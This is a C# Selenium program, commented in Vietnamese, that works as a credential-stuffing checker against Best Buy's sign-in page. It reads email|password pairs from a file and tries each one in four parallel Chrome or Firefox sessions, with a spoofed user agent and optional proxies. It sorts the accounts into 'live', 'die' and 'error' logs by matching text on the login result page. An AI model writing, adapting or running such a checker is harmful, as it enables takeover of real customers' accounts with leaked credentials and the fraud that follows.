using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Selenium
{
    class Program
    {
        public static Writer liveLogFile = new Writer(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "live.txt");
        public static Writer dieLogFile = new Writer(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "die.txt");
        public static Writer errorLogFile = new Writer(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "error.txt");
        static void Main(string[] args)
        {
            //XPATH SELENIUM THI DUNG ADDON NAY DE LAY
            //https://addons.mozilla.org/en-US/firefox/addon/xpath_finder/
            //Neu anh em su dung chrome, ae cap nhat lai Nuget chrome nhe, hien tai chi ho tro chrome 83 thoi, 85 se bi out

            string DauNganCachMailPass = "|";//dau ngan cach mail pass
            int DoDaiCuaPassword = 2;//do dai cua password
            string TenFileMailPass = "mailpass.txt";//ten file mail pass
            int typeBrowser = 1;//0 la dung chrome, 1 la dung firefox
            Dictionary<string, string> DanhSachMailPass = new Dictionary<string, string>();//DANH SACH LUU MAIL PASS

            //Doc file roi dua vao danh sach, khong can sua gi o day, thu gon lai
            #region doc_file_roi_dua_vao_danh_sach
            using (FileStream fs = File.Open(TenFileMailPass, FileMode.Open, System.IO.FileAccess.Read, FileShare.ReadWrite))
            using (BufferedStream bs = new BufferedStream(fs))
            using (StreamReader sr = new StreamReader(bs))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    line = line.Trim();//doc tung line

                    string[] MailPass = MailPassFilter(line, DauNganCachMailPass, DoDaiCuaPassword);
                    if (MailPass == null) continue;

                    string Mail = MailPass[0].Trim();
                    string Pass = MailPass[1].Trim();

                    if (DanhSachMailPass.ContainsKey(Mail)) continue;

                    DanhSachMailPass.Add(Mail, Pass);
                }
            }
            #endregion doc_file_roi_dua_vao_danh_sach

            //Bat dau multi threads, thay doi thread bang cach thay doi so 4
            #region bat_dau_multi_threads
            Parallel.ForEach(DanhSachMailPass, new ParallelOptions { MaxDegreeOfParallelism = 4 }, MailPass =>
            {
                string Mail = MailPass.Key;
                string Pass = MailPass.Value;
                string LinkMuonVao = "https://www.bestbuy.com/identity/global/signin";//link trang web muon vao
                int ThoiGianChoDoi = 5;//tinh bang giay

                if (typeBrowser == 0)
                {
                    //cai dat thong so cho chrome
                    ChromeDriver driver = null;
                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                    string ProxyHost = "";
                    int ProxyPort = 0;

                    var driverService = ChromeDriverService.CreateDefaultService();
                    //driverService.HideCommandPromptWindow = true;
                    ChromeOptions options = new ChromeOptions();
                    //options.AddArgument("headless");//neu muon dung khong hien browser thi mo? comment nay ra
                    options.AddArgument("--user-agent=" + UserAgent);//set up UserAgent, neu dung mac dinh thi comment dong nay lai
                    //options.AddArgument("--proxy-server=socks5://" + Host + ":" + Port);//dung sock 5 thi bo? comment nay
                    //options.AddArgument("--proxy-server=" + Host + ":" + Port);//dung proxy thi bo? comment nay

                    try
                    {
                        using (driver = new ChromeDriver(driverService, options))
                        {
                            driver.Navigate().GoToUrl(LinkMuonVao);//vao trang muon vao
                            Thread.Sleep(ThoiGianChoDoi * 1000);//doi page load

                            driver.FindElement(By.XPath("//*[@id=\"fld-e\"]"), 300).SendKeys(Mail);//300 la 300 giay doi, co the xoa neu khong can doi
                            driver.FindElement(By.XPath("//*[@id=\"fld-p1\"]")).SendKeys(Pass);//By.XPATH la get id, neu ko biet co the dung xpath
                            driver.FindElement(By.XPath("//button[contains(text(),'Sign In')]")).Click();//o dau source co chi cach dung xpath

                            //Khai bao
                            string checkLink = "";
                            string pageSource = "";
                            bool s = true;

                            //sau khi click signin, doi them 15s de page load xong
                            do
                            {
                                Thread.Sleep(15000);

                                try
                                {
                                    checkLink = driver.Url;//lay url hien tai
                                    pageSource = driver.PageSource;//lay ma nguon, chuot phai vao site chon View Source hoac Get Page Source
                                    s = false;
                                }
                                catch { }
                            } while (s);

                            if (driver != null)
                            {
                                driver.Quit();
                            }

                            if (pageSource.Contains("Complete Your Account</h1>"))//kiem tra pagesource co chua ki tu nay hay khong
                            {
                                liveLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                            else if (checkLink.Contains("https://www-ssl.bestbuy.com/identity/signin?token=") || checkLink.Contains("https://www.bestbuy.com/identity/signin?token="))
                            {
                                if (pageSource.Contains("Your session has expired. Please try signing in again"))
                                {
                                    errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                                else if (pageSource.Contains("<div>We didn't find an account with that email address")
                                    || pageSource.Contains("Verify Your Account")
                                    || pageSource.Contains("Please enter a valid e-mail address.</span>")
                                    || pageSource.Contains("The password was incorrect. Please try again.</div>")
                                    || pageSource.Contains("The email or password did not match our records. Please try again.</div>"))
                                {
                                    dieLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                                else
                                {
                                    errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                            }
                            else if (checkLink == "http://www.bestbuy.com/" || checkLink == "https://www.bestbuy.com/")
                            {
                                liveLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                            else
                            {
                                errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                        }
                    }
                    catch(Exception ex)
                    {
                        errorLogFile.WriteAppendToFile(Mail + "|" + Pass);

                        if (driver != null)
                        {
                            driver.Quit();
                        }
                    }
                    finally
                    {
                        if (driver != null)
                        {
                            driver.Quit();
                        }
                    }
                }
                else
                {
                    //cai dat thong so cho firefox
                    FirefoxDriver driver = null;
                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0";
                    string ProxyHost = "";
                    int ProxyPort = 0;


                    FirefoxDriverService driverService = FirefoxDriverService.CreateDefaultService(".", "geckodriver.exe");
                    driverService.HideCommandPromptWindow = true;

                    FirefoxProfile profile = new FirefoxProfile();
                    profile.SetPreference("general.useragent.override", UserAgent);

                    //dung sock thi mo? comment nay ra
                    /*
                    profile.SetPreference("network.proxy.type", 1);
                    profile.SetPreference("network.proxy.socks", ProxyHost);
                    profile.SetPreference("network.proxy.socks_port", ProxyPort);
                    profile.SetPreference("network.proxy.socks_version", 5);
                    */

                    //dung proxy thi mo? comment nay ra
                    /*
                    profile.SetPreference("network.proxy.type", 1);
                    profile.SetPreference("network.proxy.http", Host);
                    profile.SetPreference("network.proxy.http_port", Port);
                    profile.SetPreference("network.proxy.ssl", Host);
                    profile.SetPreference("network.proxy.ssl_port", Port);
                    */

                    FirefoxOptions options = new FirefoxOptions();
                    //options.AddArgument("--headless");//muon an browser thi mo? comment nay ra
                    options.AddArgument("--private");//su dung private tab
                    options.Profile = profile;

                    try
                    {
                        using (driver = new FirefoxDriver(driverService, options))
                        {
                            driver.Navigate().GoToUrl(LinkMuonVao);//vao trang muon vao
                            Thread.Sleep(ThoiGianChoDoi * 1000);//doi page load

                            driver.FindElement(By.XPath("//*[@id=\"fld-e\"]"), 300).SendKeys(Mail);//300 la 300 giay doi, co the xoa neu khong can doi
                            driver.FindElement(By.XPath("//*[@id=\"fld-p1\"]")).SendKeys(Pass);//By.XPATH la get id, neu ko biet co the dung xpath
                            driver.FindElement(By.XPath("//button[contains(text(),'Sign In')]")).Click();//o dau source co chi cach dung xpath

                            //Khai bao
                            string checkLink = "";
                            string pageSource = "";
                            bool s = true;

                            //sau khi click signin, doi them 15s de page load xong
                            do
                            {
                                Thread.Sleep(15000);

                                try
                                {
                                    checkLink = driver.Url;//lay url hien tai
                                    pageSource = driver.PageSource;//lay ma nguon, chuot phai vao site chon View Source hoac Get Page Source
                                    s = false;
                                }
                                catch { }
                            } while (s);

                            if (driver != null)
                            {
                                driver.Quit();
                            }

                            if (pageSource.Contains("Complete Your Account</h1>"))//kiem tra pagesource co chua ki tu nay hay khong
                            {
                                liveLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                            else if (checkLink.Contains("https://www-ssl.bestbuy.com/identity/signin?token=") || checkLink.Contains("https://www.bestbuy.com/identity/signin?token="))
                            {
                                if (pageSource.Contains("Your session has expired. Please try signing in again"))
                                {
                                    errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                                else if (pageSource.Contains("<div>We didn't find an account with that email address")
                                    || pageSource.Contains("Verify Your Account")
                                    || pageSource.Contains("Please enter a valid e-mail address.</span>")
                                    || pageSource.Contains("The password was incorrect. Please try again.</div>")
                                    || pageSource.Contains("The email or password did not match our records. Please try again.</div>"))
                                {
                                    dieLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                                else
                                {
                                    errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                                }
                            }
                            else if (checkLink == "http://www.bestbuy.com/" || checkLink == "https://www.bestbuy.com/")
                            {
                                liveLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                            else
                            {
                                errorLogFile.WriteAppendToFile(Mail + "|" + Pass);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        errorLogFile.WriteAppendToFile(Mail + "|" + Pass);

                        if (driver != null)
                        {
                            driver.Quit();
                        }
                    }
                    finally
                    {
                        if (driver != null)
                        {
                            driver.Quit();
                        }
                    }
                }
            });
            #endregion bat_dau_multi_threads

            //tat cac tac vu
            Process[] AllProcesses = Process.GetProcesses();
            foreach (var process in AllProcesses)
            {
                string s = process.ProcessName.ToLower();
                if (s == "firefox" || s == "geckodriver" || s == "chromedriver")
                    process.Kill();
            }


        }

































        public static string[] MailPassFilter(string MailPass, string Determine, int FilterPass)
        {
            string[] Element = MailPass.Split(new string[] { Determine }, StringSplitOptions.None);
            for (int i = 0; i < Element.Length; i++)
            {
                if (Element[i].Contains("@"))
                {
                    try
                    {
                        if (Element[i + 1].Trim().Count() > FilterPass)
                        {
                            return new string[] { Element[i].Trim(), Element[i + 1].Trim() };
                        }
                        else
                        {
                            return null;
                        }
                    }
                    catch
                    {
                        return null;
                    }
                }
            }
            return null;
        }
    }
}
